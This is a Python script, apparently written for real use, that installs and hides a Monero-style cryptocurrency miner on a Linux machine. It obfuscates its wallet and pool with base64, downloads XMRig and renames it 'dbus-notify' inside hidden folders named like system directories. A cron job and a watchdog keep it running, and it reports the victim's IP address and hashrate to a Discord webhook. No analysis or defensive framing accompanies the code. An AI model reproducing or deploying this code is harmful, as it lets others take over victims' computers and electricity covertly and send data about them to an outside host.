import os, subprocess, time, socket, threading, requests, base64, shutil

# === CONFIG (obfuscated)
WALLET = base64.b64decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=").decode()
POOL = base64.b64decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=").decode()
COIN = "zeph"
THREADS = "4"
RIG_ID = "sysd0"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # <= REPLACE THIS

MAIN_DIR = os.path.expanduser("~/.cache/.X11-unix")
FALLBACK_DIR = os.path.expanduser("~/.local/share/.syslogd")
MINER_NAME = "dbus-notify"
MINER_BIN = os.path.join(MAIN_DIR, MINER_NAME)
LOGFILE = os.path.join(MAIN_DIR, "syslog.txt")
SCRIPT_PATH = os.path.abspath(__file__)
status = {"running": False, "start_time": None}

def send_discord(msg):
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": msg})
    except Exception as e:
        try:
            with open("/tmp/forever_discord_fail.log", "a") as f:
                f.write(f"[discord_fail] {str(e)}: {msg}\n")
        except: pass

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
    except Exception as e:
        send_discord(f"⚠️ CMD FAIL: {cmd}\n{e}")
        return ""

def fix_path():
    try:
        if os.path.isdir(MINER_BIN):
            shutil.rmtree(MINER_BIN)
        elif os.path.isfile(MINER_BIN):
            os.chmod(MINER_BIN, 0o700)
    except Exception as e:
        try:
            os.remove(MINER_BIN)
        except: send_discord(f"❌ Remove fail: {e}")
    os.makedirs(MAIN_DIR, exist_ok=True)

def fallback_path():
    os.makedirs(FALLBACK_DIR, exist_ok=True)
    return os.path.join(FALLBACK_DIR, MINER_NAME)

def install_miner():
    try:
        fix_path()
        archive = os.path.join(MAIN_DIR, "xmr.tar.gz")
        url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
        run_cmd(f"wget -qO {archive} {url}")
        run_cmd(f"tar -xf {archive} -C {MAIN_DIR}")
        target_path = MINER_BIN if os.access(MAIN_DIR, os.W_OK) else fallback_path()
        for f in os.listdir(MAIN_DIR):
            path = os.path.join(MAIN_DIR, f)
            if "xmrig" in f and os.access(path, os.X_OK):
                shutil.copy2(path, target_path)
                os.chmod(target_path, 0o700)
                return
        raise FileNotFoundError("No valid miner binary found in archive.")
    except Exception as e:
        send_discord(f"❌ Install error: {e}")

def start_miner():
    try:
        if not status["running"]:
            install_miner()
            miner = MINER_BIN if os.path.isfile(MINER_BIN) and os.access(MINER_BIN, os.X_OK) else fallback_path()
            cmd = f'{miner} -o {POOL} -u {WALLET} -p x -a rx/0 --coin {COIN} -t {THREADS} --tls --rig-id {RIG_ID} --donate-level=1'
            with open(LOGFILE, "a") as log:
                subprocess.Popen(cmd.split(), stdout=log, stderr=log)
            status["running"] = True
            status["start_time"] = time.time()
            send_discord(f"✅ Miner started\n{get_status()}")
    except Exception as e:
        send_discord(f"❌ start_miner FAIL: {e}")

def stop_miner():
    run_cmd(f"pkill -f {MINER_NAME}")
    status["running"] = False
    status["start_time"] = None
    send_discord("🛑 Miner stopped.")

def get_status():
    uptime = int(time.time() - status["start_time"]) if status["start_time"] else 0
    try:
        ip = requests.get("https://api.ipify.org").text.strip()
    except:
        ip = "?"
    return f"💠 Miner: {'✅ Running' if status['running'] else '❌ Stopped'}\nIP: {ip}\nUptime: {uptime//60}m\nThreads: {THREADS}"

def get_hashrate():
    try:
        out = run_cmd(f"tail -n 50 {LOGFILE}")
        for line in out.splitlines()[::-1]:
            if "speed" in line.lower():
                return line.strip()
        return "No rate yet."
    except Exception as e:
        send_discord(f"❓ rate error: {e}")
        return "❓"

def setup_cron():
    try:
        cronline = f"*/3 * * * * pgrep -f {SCRIPT_PATH} > /dev/null || python3 {SCRIPT_PATH} &"
        croncmd = f'(crontab -l 2>/dev/null; echo "{cronline}") | sort | uniq | crontab -'
        run_cmd(croncmd)
    except Exception as e:
        send_discord(f"⚠️ cron setup failed: {e}")

def watchdog():
    while True:
        time.sleep(10)
        try:
            if status["running"]:
                if not run_cmd(f"pgrep -f {MINER_NAME}").strip():
                    send_discord("⚠️ Miner died. Restarting...")
                    start_miner()
        except Exception as e:
            send_discord(f"❌ Watchdog error: {e}")

def self_guard():
    try:
        import psutil
        me = os.path.abspath(__file__)
        for p in psutil.process_iter(['pid', 'cmdline']):
            try:
                if p.pid != os.getpid() and me in ' '.join(p.cmdline()):
                    exit()
            except:
                continue
    except Exception as e:
        send_discord(f"❌ psutil check failed: {e}")

def main():
    self_guard()
    setup_cron()
    threading.Thread(target=watchdog, daemon=True).start()
    start_miner()
    while True:
        time.sleep(1800)
        send_discord(f"⏳ Alive: {get_hashrate()}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        send_discord(f"💥 Top-level crash: {e}")
